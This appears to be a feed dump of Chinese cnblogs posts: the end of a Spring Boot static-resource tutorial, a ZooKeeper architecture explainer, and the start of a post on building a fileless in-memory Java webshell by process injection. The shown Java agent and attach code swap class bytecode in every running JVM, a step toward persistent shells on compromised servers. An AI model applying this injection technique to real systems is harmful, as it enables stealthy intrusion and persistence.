&lt;p&gt;　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/640632/201809/640632-20180921113421874-552149175.png&quot; alt=&quot;&quot; width=&quot;779&quot; height=&quot;394&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/640632/201809/640632-20180921115850876-1821556715.png&quot; alt=&quot;&quot; width=&quot;779&quot; height=&quot;300&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　发现servlet-context的根路径如上图所示，查看一下这个路径对应的目录，发现什么都没有，所以很显然无法找到我们要找的文件了。毕竟一般使用springboot都是jar项目，servlet-context path下没有用户自定义的资源。&lt;/p&gt;
&lt;h2&gt; 六、其他方式&lt;/h2&gt;
&lt;p&gt;　　&lt;span&gt;&lt;strong&gt;在Servlet3协议规范中，包含在JAR文件/META-INFO/resources/路径下的资源可以直接访问了&lt;/strong&gt;&lt;/span&gt;。如果将springboot项目打包成war包，可以配置一个默认的servlet。在WebMvcConfigurationSupport中已经定义好了，不过默认是一个EmptyHandlerMapping。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;pre&gt;
&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
 * Return a handler mapping ordered at Integer.MAX_VALUE with a mapped
 * default servlet handler. To configure &quot;default&quot; Servlet handling,
 * override {&lt;/span&gt;&lt;span&gt;@link&lt;/span&gt;&lt;span&gt; #configureDefaultServletHandling}.
 &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;&lt;span&gt;
@Bean
&lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; HandlerMapping defaultServletHandlerMapping() {
    DefaultServletHandlerConfigurer configurer &lt;/span&gt;= &lt;span&gt;new&lt;/span&gt;&lt;span&gt; DefaultServletHandlerConfigurer(servletContext);
    &lt;span&gt;&lt;strong&gt;configureDefaultServletHandling&lt;/strong&gt;&lt;/span&gt;(configurer);
    AbstractHandlerMapping handlerMapping &lt;/span&gt;=&lt;span&gt; configurer.getHandlerMapping();
    handlerMapping &lt;/span&gt;= handlerMapping != &lt;span&gt;null&lt;/span&gt; ? handlerMapping : &lt;span&gt;new&lt;/span&gt;&lt;span&gt; EmptyHandlerMapping();
    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; handlerMapping;
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　可以通过自定义一个WebMvcConfigurer类型的bean，改写&lt;strong&gt;configureDefaultServletHandling&lt;/strong&gt; &lt;span&gt;方法&lt;span&gt;，如下。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
&lt;span&gt;@Configuration
&lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt; MyWebConfigurer &lt;span&gt;extends&lt;/span&gt;&lt;span&gt; WebMvcConfigurerAdapter {
    @Override
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; configureDefaultServletHandling(DefaultServletHandlerConfigurer configurer) {
        configurer.enable();
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　这样就设置了一个默认的servlet，在加载静态资源的时候就会按照servelt方式去加载了。&lt;/p&gt;

&lt;p&gt;&lt;span&gt;&lt;strong&gt;　 就先分享这么多了，更多分享请关注我们的技术公众号吧！！！&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
</description>
<pubDate>Fri, 21 Sep 2018 06:05:00 +0000</pubDate>
<dc:creator>小眼儿</dc:creator>
<og:description>一、前言 springboot配置静态资源方式是多种多样，接下来我会介绍其中几种方式，并解析一下其中的原理。 二、使用properties属性进行配置 应该说 spring.mvc.stat</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/hujunzheng/p/9682960.html</dc:identifier>
</item>
<item>
<title>深入理解zookeeper架构-《每日五分钟搞定大数据》 - 大叔据</title>
<link>http://www.cnblogs.com/uncleData/p/9686220.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/uncleData/p/9686220.html</guid>
<description>&lt;blockquote readability=&quot;8&quot;&gt;
&lt;p&gt;Zookeeper作为一个分布式协调系统提供了一项基本服务：&lt;strong&gt;分布式锁服务&lt;/strong&gt;，分布式锁是分布式协调技术实现的核心内容。像配置管理、任务分发、组服务、分布式消息队列、分布式通知/协调等，这些应用实际上都是基于这项基础服务由用户自己摸索出来的。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;zookeeper作为分布式协调系统在大数据领域非常常用，它是一个很好的中心化管理工具。下面举几个常见的应用场景。&lt;/p&gt;
&lt;h2 id=&quot;hdfsyarn&quot;&gt;1.1.HDFS/YARN&lt;/h2&gt;
&lt;ul readability=&quot;0.5&quot;&gt;&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;&lt;strong&gt;HA(分布式锁的应用)&lt;/strong&gt;：Master挂掉之后迅速&lt;strong&gt;切换&lt;/strong&gt;到slave节点。&lt;/p&gt;
&lt;h2 id=&quot;hbase&quot;&gt;1.2.hbase&lt;/h2&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;HA&lt;/strong&gt; ：同上。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;配置管理&lt;/strong&gt; ：client需要读写hbase的数据&lt;strong&gt;首先都是连到ZK&lt;/strong&gt;读取root表，获得meta表所在的region，最后找到数据所在位置。&lt;/li&gt;
&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;&lt;strong&gt;任务发布&lt;/strong&gt;：regionserver挂了一台，master需要&lt;strong&gt;重新分配region&lt;/strong&gt;，会把任务放在zookeeper等regionserver来获取&lt;/p&gt;
&lt;h2 id=&quot;kafka&quot;&gt;1.3.kafka&lt;/h2&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;配置管理&lt;/strong&gt;：broker会在zookeeper注册并保持相关的元数据（topic，partition信息等）更新&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;&lt;strong&gt;任务分配&lt;/strong&gt;：给topic分配partitions和replication&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;数据结构&quot;&gt;2.1.数据结构&lt;/h2&gt;
&lt;p&gt;ZooKeeper命名空间中的Znode，兼具文件和目录两种特点。既像文件一样维护着&lt;strong&gt;数据、元信息、ACL、时间戳&lt;/strong&gt;等数据结构，又像目录一样可以作为路径标识的一部分。 每个Znode由3部分组成:&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;&lt;strong&gt;stat状态信息&lt;/strong&gt;：描述该Znode的版本, 权限等信息&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;data&lt;/strong&gt;：与该Znode关联的数据(配置文件信息、状态信息、汇集位置)，数据大小至多1M&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;children&lt;/strong&gt;：该Znode下的子节点&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;ZooKeeper中的每个节点存储的数据要被&lt;strong&gt;原子性&lt;/strong&gt;的操作。也就是说读操作将获取与节点相关的所有数据，写操作也将替换掉节点的所有数据。另外，每一个节点都拥有自己的ACL(访问控制列表)，这个列表规定了用户的权限，即限定了特定用户对目标节点可以执行的操作。&lt;/p&gt;
&lt;h2 id=&quot;watch机制&quot;&gt;2.2.watch机制&lt;/h2&gt;
&lt;p&gt;ZooKeeper可以为所有的读操作设置watch，包括：&lt;strong&gt;exists()、getChildren()及getData()&lt;/strong&gt;。当节点状态发生改变时(Znode的增、删、改)将会触发watch所对应的操作。当watch被触发时，ZooKeeper将会向客户端发送且仅发送一条通知，因为watch只能被触发一次，这样可以减少网络流量。&lt;/p&gt;
&lt;ol readability=&quot;-0.5&quot;&gt;&lt;li&gt;数据watch(data watches)：getData和exists负责设置数据watch&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;孩子watch(child watches)：getChildren负责设置孩子watch&lt;/p&gt;
&lt;h2 id=&quot;节点类型&quot;&gt;2.3.节点类型&lt;/h2&gt;
ZooKeeper中的节点有两种，分别为临时节点和永久节点(还可再分为有序无序)。节点的类型在创建时即被确定，并且不能改变。&lt;/li&gt;
&lt;li&gt;临时节点：该节点的生命周期&lt;strong&gt;依赖于创建它们的会话&lt;/strong&gt;。一旦会话(Session)结束，临时节点将被自动删除，当然可以也可以手动删除。虽然每个临时的Znode都会绑定到一个客户端会话，但他们对所有的客户端还是可见的。另外，ZooKeeper的临时节点不允许拥有子节点。（分布式队列）&lt;/li&gt;
&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;永久节点：该节点的生命周期不依赖于会话，并且只有在客户端显示执行删除操作的时候，他们才能被删除。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&quot;ha&quot;&gt;3.1.HA:&lt;/h2&gt;
&lt;p&gt;两种方式：&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;创建两个或多个有序临时节点，永远把最小值当做master&lt;br/&gt;&lt;/li&gt;
&lt;li&gt;创建临时节点的为master，多个slave会watch这个节点&lt;/li&gt;
&lt;/ol&gt;&lt;h2 id=&quot;配置管理&quot;&gt;3.2.配置管理：&lt;/h2&gt;
&lt;p&gt;存储集群元数据提供给client使用，体现在比如需要对HBase和Kafka操作时，都会直接连到zookeeper，zookeeper记录了数据存储的位置，存活的节点等元数据信息。&lt;/p&gt;
&lt;h2 id=&quot;任务发布&quot;&gt;3.3.任务发布：&lt;/h2&gt;
&lt;p&gt;Master要监视/works和/tasks两个永久节点，以便能感知到由哪些slave当前可用，当前有新任务需要分配。&lt;br/&gt;分配过程：在/assign下创建当前可用的workA，找到需要分配的taskA，创建/assign/workA/taskA&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://upload-images.jianshu.io/upload_images/3334524-12e82bcb696f655f.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240&quot; alt=&quot;zkservice.jpg&quot;/&gt;&lt;/p&gt;
&lt;p&gt;  zookeeper作为一个分布式协调系统，很多组件都会依赖它，那么此时它的可用性就非常重要了，那么保证可用性的同时作为分布式系统的它是怎么保证扩展性的？问题很多，读完接下来的内容你会有答案。&lt;/p&gt;
&lt;p&gt;  上图来自zookeeper的官方文档，我解释下这张图的各个角色（observer在上图中可以理解为特殊的follower）&lt;/p&gt;
&lt;table&gt;&lt;thead/&gt;&lt;tbody readability=&quot;4&quot;&gt;&lt;tr class=&quot;odd&quot;&gt;&lt;td&gt;client客户端&lt;/td&gt;
&lt;td&gt;请求发起方&lt;/td&gt;
&lt;td&gt;不限&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot; readability=&quot;2&quot;&gt;&lt;td&gt;observer观察者&lt;/td&gt;
&lt;td&gt;接受用户读写请求，写转发给leader，读直接返回（选主过程不参加投票）&lt;/td&gt;
&lt;td&gt;不限&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot; readability=&quot;4&quot;&gt;&lt;td&gt;follower跟随者&lt;/td&gt;
&lt;td&gt;接受用户读写请求，写转发给leader，读直接返回（选主过程参加投票）&lt;/td&gt;
&lt;td&gt;奇数个（不可过多）&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot; readability=&quot;2&quot;&gt;&lt;td&gt;leader领导者&lt;/td&gt;
&lt;td&gt;负责提议，更新系统状态&lt;/td&gt;
&lt;td&gt;1个&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p&gt;&lt;strong&gt;另外&lt;/strong&gt;：follower和observer同时均为learner（学习者）角色，learner的分工是同步leader的状态。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://zookeeper.apache.org/doc/r3.4.13/images/zkcomponents.jpg&quot; alt=&quot;zookeeper读写流程&quot;/&gt;&lt;br/&gt;  zookeeper的各个复制集节点（follower，leader，observer）都包含了集群所有的数据且存在内存中，像个内存数据库。更新操作会以日志的形式记录到磁盘以保证可恢复性，并且写入操作会在写入内存数据库之前序列化到磁盘。&lt;/p&gt;
&lt;p&gt;  每个ZooKeeper服务器都为客户端服务。客户端只连接到一台服务器以提交请求。读取请求由每个服务器数据库的本地副本提供服务。更改服务状态，写请求的请求由zab协议处理。&lt;/p&gt;
&lt;p&gt;  作为协议协议的一部分，&lt;strong&gt;来自客户端的所有写入请求都被转发到称为leader的单个服务器。其余的ZooKeeper服务器（称为followers）接收来自领导者leader的消息提议并同意消息传递&lt;/strong&gt;。消息传递层负责替换失败的leader并将followers与leader同步。&lt;/p&gt;
&lt;p&gt;  ZooKeeper使用自定义原子消息传递协议zab。由于消息传递层是原子的，当领导者收到写入请求时，它会计算应用写入时系统的状态，并将其转换为捕获此新状态的事务。&lt;/p&gt;

&lt;p&gt;  cap原则是指作为一个分布式系统，一致性，可用性，分区容错性这三个方面，最多只能任意选择两种。&lt;strong&gt;就是必定会要有取舍&lt;/strong&gt;。&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;strong&gt;一致性C&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;  Zookeeper是强一致性系统，同步数据很快。&lt;strong&gt;但是在不用sync()操作的前提下无法保证各节点的数据完全一致&lt;/strong&gt;。zookeeper为了保证一致性使用了基于paxos协议且为zookeeper量身定做的zab协议。这两个协议是什么东西之后的文章会讲。&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;strong&gt;可用性A（高可用性和响应能力）&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;  Zookeeper数据存储在内存中，且各个节点都可以相应读请求，具有好的响应性能。Zookeeper保证了可用性,&lt;strong&gt;数据总是可用的,没有锁&lt;/strong&gt;.并且有一大半的节点所拥有的数据是最新的,实时的。&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;strong&gt;分区容忍性P&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;  有2点需要分析的&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;节点多了会导致写数据延时非常大（需要半数以上follower写完提交）,因为需要多个节点同步.&lt;/li&gt;
&lt;li&gt;节点多了Leader选举非常耗时, 就会放大网络的问题. 可以通过引入 observer节点缓解这个问题.&lt;/li&gt;
&lt;/ol&gt;&lt;h2 id=&quot;zk在cap问题上做的取舍&quot;&gt;zk在CAP问题上做的取舍&lt;/h2&gt;
&lt;p&gt;  严格地意义来讲zk把取舍这个问题抛给了开发者即用户。&lt;/p&gt;
&lt;p&gt;  为了协调CA（一致性和可用性），用户可以自己选择是否使用Sync()操作。使用则保证所有节点强一致，但是这个操作同步数据会有一定的延迟时间。反过来若不是必须保证强一致性的场景，可不使用sync，虽然zookeeper同步的数据很快，但是&lt;strong&gt;此时是没有办法保证各个节点的数据一定是一致的&lt;/strong&gt;，这一点用户要注意。实际的开发中就要开发者根据实际场景来做取舍了，看更关注一致性还是可用性。&lt;/p&gt;
&lt;p&gt;  为了协调AP（一致性和扩展性），用户可以自己选择是否添加obsever以及添加个数，observer是3.3.0 以后版本新增角色，它不会参加选举和投票过程，目的就是提高集群扩展性。因为follower的数量不能过多，&lt;strong&gt;follower需要参加选举和投票，过多的话选举的收敛速度会非常慢，写数据时的投票过程也会很久&lt;/strong&gt;。observer的增加可以提高可用性和扩展性，集群可接受client请求的点多了，可用性自然会提高，但是一致性的问题依然存在，这时又回到了上面CA的取舍问题上。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;FastLeaderElection原理&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;每个Zookeeper服务器，都需要在数据文件夹下创建一个名为myid的文件，该文件包含整个Zookeeper集群唯一的ID（整数）。例如某Zookeeper集群包含三台服务器，hostname分别为zoo1、zoo2和zoo3，其myid分别为1、2和3，则在配置文件中其ID与hostname必须一一对应，如下所示。在该配置文件中，server.后面的数据即为myid&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;server.1=zoo1:2888:3888
server.2=zoo2:2888:3888
server.3=zoo3:2888:3888&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;类似于RDBMS中的事务ID，用于标识一次更新操作的Proposal ID。为了保证顺序性，该zkid必须单调递增。因此Zookeeper使用一个64位的数来表示，高32位是Leader的epoch，从1开始，每次选出新的Leader，epoch加一。低32位为该epoch内的序号，每次epoch变化，都将低32位的序号重置。这样保证了zkid的全局递增性。&lt;/p&gt;
&lt;h2 id=&quot;支持的领导选举算法&quot;&gt;7.1.支持的领导选举算法&lt;/h2&gt;
&lt;p&gt;可通过electionAlg配置项设置Zookeeper用于领导选举的算法。&lt;br/&gt;到3.4.10版本为止，可选项有&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;0 基于UDP的LeaderElection
1 基于UDP的FastLeaderElection
2 基于UDP和认证的FastLeaderElection
3 基于TCP的FastLeaderElection&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;在3.4.10版本中，默认值为3，也即基于TCP的FastLeaderElection。另外三种算法已经被弃用，并且有计划在之后的版本中将它们彻底删除而不再支持。&lt;/p&gt;
&lt;h2 id=&quot;fastleaderelection&quot;&gt;7.2.FastLeaderElection&lt;/h2&gt;
&lt;p&gt;FastLeaderElection选举算法是标准的Fast Paxos算法实现，可解决LeaderElection选举算法收敛速度慢的问题。&lt;br/&gt;服务器状态&lt;/p&gt;
&lt;ul readability=&quot;-0.5&quot;&gt;&lt;li&gt;LOOKING 不确定Leader状态。该状态下的服务器认为当前集群中没有Leader，会发起Leader选举&lt;/li&gt;
&lt;li&gt;FOLLOWING 跟随者状态。表明当前服务器角色是Follower，并且它知道Leader是谁&lt;/li&gt;
&lt;li&gt;LEADING 领导者状态。表明当前服务器角色是Leader，它会维护与Follower间的心跳&lt;/li&gt;
&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;OBSERVING 观察者状态。表明当前服务器角色是Observer，与Folower唯一的不同在于不参与选举，也不参与集群写操作时的投票&lt;/p&gt;
&lt;h2 id=&quot;选票数据结构&quot;&gt;7.2.选票数据结构&lt;/h2&gt;
每个服务器在进行领导选举时，会发送如下关键信息&lt;/li&gt;
&lt;li&gt;logicClock 每个服务器会维护一个自增的整数，名为logicClock，它表示这是该服务器发起的第多少轮投票&lt;/li&gt;
&lt;li&gt;state 当前服务器的状态&lt;/li&gt;
&lt;li&gt;self_id 当前服务器的myid&lt;/li&gt;
&lt;li&gt;self_zxid 当前服务器上所保存的数据的最大zxid&lt;/li&gt;
&lt;li&gt;vote_id 被推举的服务器的myid&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;vote_zxid 被推举的服务器上所保存的数据的最大zxid&lt;/p&gt;
&lt;h2 id=&quot;投票流程&quot;&gt;7.2.投票流程&lt;/h2&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;自增选举轮次&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;Zookeeper规定所有有效的投票都必须在同一轮次中。每个服务器在开始新一轮投票时，会先对自己维护的logicClock进行自增操作。&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;strong&gt;初始化选票&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;每个服务器在广播自己的选票前，会将自己的投票箱清空。该投票箱记录了所收到的选票。例：服务器2投票给服务器3，服务器3投票给服务器1，则服务器1的投票箱为(2, 3), (3, 1), (1, 1)。票箱中只会记录每一投票者的最后一票，如投票者更新自己的选票，则其它服务器收到该新选票后会在自己票箱中更新该服务器的选票。&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;strong&gt;发送初始化选票&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;每个服务器最开始都是通过广播把票投给自己。&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;strong&gt;接收外部投票&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;服务器会尝试从其它服务器获取投票，并记入自己的投票箱内。如果无法获取任何外部投票，则会确认自己是否与集群中其它服务器保持着有效连接。如果是，则再次发送自己的投票；如果否，则马上与之建立连接。&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;strong&gt;判断选举轮次&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;收到外部投票后，首先会根据投票信息中所包含的logicClock来进行不同处理&lt;br/&gt;外部投票的logicClock大于自己的logicClock。说明该服务器的选举轮次落后于其它服务器的选举轮次，立即清空自己的投票箱并将自己的logicClock更新为收到的logicClock，然后再对比自己之前的投票与收到的投票以确定是否需要变更自己的投票，最终再次将自己的投票广播出去。&lt;br/&gt;外部投票的logicClock小于自己的logicClock。当前服务器直接忽略该投票，继续处理下一个投票。&lt;br/&gt;外部投票的logickClock与自己的相等。当时进行选票PK。&lt;/p&gt;
&lt;p&gt;选票PK是基于(self_id, self_zxid)与(vote_id, vote_zxid)的对比&lt;br/&gt;外部投票的logicClock大于自己的logicClock，则将自己的logicClock及自己的选票的logicClock变更为收到的logicClock&lt;br/&gt;若logicClock一致，则对比二者的vote_zxid，若外部投票的vote_zxid比较大，则将自己的票中的vote_zxid与vote_myid更新为收到的票中的vote_zxid与vote_myid并广播出去，另外将收到的票及自己更新后的票放入自己的票箱。如果票箱内已存在(self_myid, self_zxid)相同的选票，则直接覆盖&lt;br/&gt;若二者vote_zxid一致，则比较二者的vote_myid，若外部投票的vote_myid比较大，则将自己的票中的vote_myid更新为收到的票中的vote_myid并广播出去，另外将收到的票及自己更新后的票放入自己的票箱&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;strong&gt;统计选票&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;如果已经确定有过半服务器认可了自己的投票（可能是更新后的投票），则终止投票。否则继续接收其它服务器的投票。&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;strong&gt;更新服务器状态&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;投票终止后，服务器开始更新自身状态。若过半的票投给了自己，则将自己的服务器状态更新为LEADING，否则将自己的状态更新为FOLLOWING&lt;/p&gt;
&lt;blockquote readability=&quot;6&quot;&gt;
&lt;p&gt;《每日五分钟搞定大数据》原创系列，每周不定时更新。评论不能及时回复可直接加公众号提问或交流，知无不答，谢谢 。&lt;br/&gt;&lt;img src=&quot;https://upload-images.jianshu.io/upload_images/3334524-a32f634684a8d101.JPG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240&quot; alt=&quot;欢迎关注大叔&quot;/&gt;&lt;/p&gt;
&lt;/blockquote&gt;
</description>
<pubDate>Fri, 21 Sep 2018 06:02:00 +0000</pubDate>
<dc:creator>大叔据</dc:creator>
<og:description>Zookeeper作为一个分布式协调系统提供了一项基本服务： 分布式锁服务 ，分布式锁是分布式协调技术实现的核心内容。像配置管理、任务分发、组服务、分布式消息队列、分布式通知/协调等，这些应用实际上都</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/uncleData/p/9686220.html</dc:identifier>
</item>
<item>
<title>【原创】利用“进程注入”实现无文件不死webshell - rebeyond</title>
<link>http://www.cnblogs.com/rebeyond/p/9686213.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/rebeyond/p/9686213.html</guid>
<description>&lt;p&gt;  上周末，一个好兄弟找我说一个很重要的目标shell丢了，这个shell之前是通过一个S2代码执行的漏洞拿到的，现在漏洞还在，不过web目录全部不可写，问我有没有办法搞个webshell继续做内网。正好我之前一直有个通过“进程注入”来实现内存webshell的想法，于是就趁这个机会以Java为例做了个内存webshell出来（暂且叫它memShell吧），给大家分享一下：）&lt;/p&gt;

&lt;p&gt;  一般在渗透过程中，我们通常会用到webshell，一个以文件的形式存在于Web容器内的恶意脚本文件。我们通过webshell来让Web Server来执行我们的任意指令。如果在某些机选情况下，我们不想或者不能在Web目录下面写入文件，是不是就束手无策了？当然不是，写入webshell并不是让Web Server来执行我们任意代码的唯一方式，通过直接修改进程的内存也可以实现这个目的。我们只要拥有一个web容器进程执行用户的权限，理论上就可以完全控制该进程的地址空间（更确切的说是地址空间中的非Kernel部分），包括地址空间内的数据和代码。OS层进程注入的方法有很多，不过具体到Java环境，我们不需要使用操作系统层面的进程注入方法。Java为我们提供了更方便的接口，Java Instrumentation。&lt;/p&gt;

&lt;p&gt;  先看下官方概念：java Instrumentation指的是可以用独立于应用程序之外的代理（agent）程序来监测和协助运行在JVM上的应用程序。这种监测和协助包括但不限于获取JVM运行时状态，替换和修改类定义等。简单一句话概括下：Java Instrumentation可以在JVM启动后，动态修改已加载或者未加载的类，包括类的属性、方法。该机制最早于Java SE5 引入，Java SE6之后的机制相对于Java SE5有较大改进，因为现在Java SE5这种古董级别的环境已经不多，此处不再赘述。&lt;/p&gt;
&lt;p&gt;下面看一个简单的例子：首先新建3个Java工程Example、Agent和AgentStarter。&lt;/p&gt;
&lt;p&gt;1.在工程Example中新建2个类：&lt;/p&gt;
&lt;p&gt;Bird.java:&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;public class Bird {

    public void say()
    {
        System.out.println(&quot;bird is gone.&quot;);
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;然后把编译后的Bird.class复制出来，放到D盘根目录。然后把Bird.java再改成如下:&lt;/p&gt;
&lt;p&gt;Bird.java:&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;public class Bird {
    public void say()
    {
        System.out.println(&quot;bird say hello&quot;);
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;Main.java：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;public class Main {
    public static void main(String[] args) throws Exception {
        // TODO Auto-generated method stub

        while(true)
        {
            Bird bird=new Bird();
            bird.say();
            Thread.sleep(3000);
        }    
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;把整个工程打包成可执行jar包normal.jar,放到D盘根目录。&lt;/p&gt;
&lt;p&gt;2.在工程Agent中新建2个类：&lt;/p&gt;
&lt;p&gt;AgentEntry.java:&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;public class AgentEntry { 
   public static void agentmain(String agentArgs, Instrumentation inst) 
           throws ClassNotFoundException, UnmodifiableClassException, 
           InterruptedException { 
       inst.addTransformer(new Transformer (), true); 
        Class[] loadedClasses = inst.getAllLoadedClasses();
        for (Class c : loadedClasses) {
            if (c.getName().equals(&quot;Bird&quot;)) {
                try {
                    inst.retransformClasses(c);
                } catch (Exception e) {
                    // TODO Auto-generated catch block
                    e.printStackTrace();
                }
            }
        }
       System.out.println(&quot;Class changed!&quot;); 
   } 
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;Transformer.java:&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;public class Transformer implements ClassFileTransformer { 

   static byte[] mergeByteArray(byte[]... byteArray) {
       int totalLength = 0;
       for(int i = 0; i &amp;lt; byteArray.length; i ++) {
           if(byteArray[i] == null) {
               continue;
           }
           totalLength += byteArray[i].length;
       }

       byte[] result = new byte[totalLength];
       int cur = 0;
       for(int i = 0; i &amp;lt; byteArray.length; i++) {
           if(byteArray[i] == null) {
               continue;
           }
           System.arraycopy(byteArray[i], 0, result, cur, byteArray[i].length);
           cur += byteArray[i].length;
       }

       return result;
   }
   public static byte[] getBytesFromFile(String fileName) { 
       try { 
           byte[] result=new byte[] {};
           InputStream is = new FileInputStream(new File(fileName)); 
           byte[] bytes = new byte[1024];
           int num = 0;
           while ((num = is.read(bytes)) != -1) {
               result=mergeByteArray(result,Arrays.copyOfRange(bytes, 0, num));       
           }
           is.close();
           return result; 
       } catch (Exception e) { 
           e.printStackTrace();
           return null;
       } 
   } 

   public byte[] transform(ClassLoader classLoader, String className, Class&amp;lt;?&amp;gt; c, 
           ProtectionDomain pd, byte[] b) throws IllegalClassFormatException { 
       if (!className.equals(&quot;Bird&quot;)) { 
           return null; 
       } 
       return getBytesFromFile(&quot;d:/Bird.class&quot;); 

   } 
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;新建一个mainfest文件：&lt;/p&gt;
&lt;p&gt;MAINFEST.MF:&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;Manifest-Version: 1.0 
Agent-Class: AgentEntry
Can-Retransform-Classes: true&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;然后把Agent工程打包为agent.jar，放到D盘根目录。&lt;/p&gt;
&lt;p&gt;3.在AgentStarter工程中新建1个类：&lt;/p&gt;
&lt;p&gt;Attach.java：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;public class Attach {

    public static void main(String[] args) throws Exception {

        VirtualMachine vm = null;
        List&amp;lt;VirtualMachineDescriptor&amp;gt; listAfter = null;
        List&amp;lt;VirtualMachineDescriptor&amp;gt; listBefore = null;
        listBefore = VirtualMachine.list();
        while (true) {
            try {
                listAfter = VirtualMachine.list();
                if (listAfter.size() &amp;lt;= 0)
                    continue;
                for (VirtualMachineDescriptor vmd : listAfter) {
                    vm = VirtualMachine.attach(vmd);
                    listBefore.add(vmd);
                    System.out.println(&quot;i find a vm,agent.jar was injected.&quot;);
                    Thread.sleep(1000);
                    if (null != vm) {
                        vm.loadAgent(&quot;d:/agent.jar&quot;);
                        vm.detach();
                    }
                }
                break;

            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }
}&lt;/code&gt;
&lt;/pre&gt;
